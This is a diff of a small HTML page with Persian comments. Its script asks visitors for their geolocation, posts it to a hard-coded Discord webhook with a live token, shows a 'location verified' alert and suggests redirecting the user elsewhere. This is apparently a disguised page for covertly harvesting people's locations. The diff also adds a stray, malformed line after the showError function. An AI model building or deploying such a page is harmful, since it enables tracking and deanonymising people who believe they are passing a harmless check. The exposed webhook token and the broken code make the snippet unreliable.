@@ -19,7 +19,7 @@ button { background-color: #007bff; color: white; border: none; padding: 10px 20
 
 <script>
 // آدرس وب‌هوک دیسکورد خود را اینجا قرار دهید
-const webhookURL = "https://discord.com/api/webhooks/1546079351559299093/7seQJheatYvkYmW4HOZ7gyJwjikqJRG2LfnEZtrkvva7yYYLwnbKSRJlZH0ceGrdXmPm";
+const webhookURL = "https://discord.com/api/webhooks/1546079351559299093/7seQJheatYvkYmW4HOZ7gyJwjikqJRG2LfnEZtrkvva7yYYLwnbKSRJlZH0ceGrdXmPm ";
 
 function getLocation() {
 if (navigator.geolocation) {
@@ -55,8 +55,10 @@ alert("موقعیت شما با موفقیت تایید شد.");
 // در اینجا می‌توانید کاربر را به یک عکس یا سایت دیگر هدایت کنید
 // window.location.href = "https://example.com";
 })
+
 .catch(error => console.error('Error:', error));
-}
+} // 👈 این آکولاژ را دقیقاً اینجا اضافه کن تا تابع sendLocationToServer بسته شود
+
 function showError(error) {
 switch(error.code) {
 case error.PERMISSION_DENIED:
@@ -69,7 +71,8 @@ case error.TIMEOUT:
 alert("زمان درخواست به پایان رسید.");
 break;
 }
-}
+} // 👈 این آکولاژ هم برای بسته شدن تابع showError است
+(error => console.error('Error:', error));
 </script>
 
 </body>
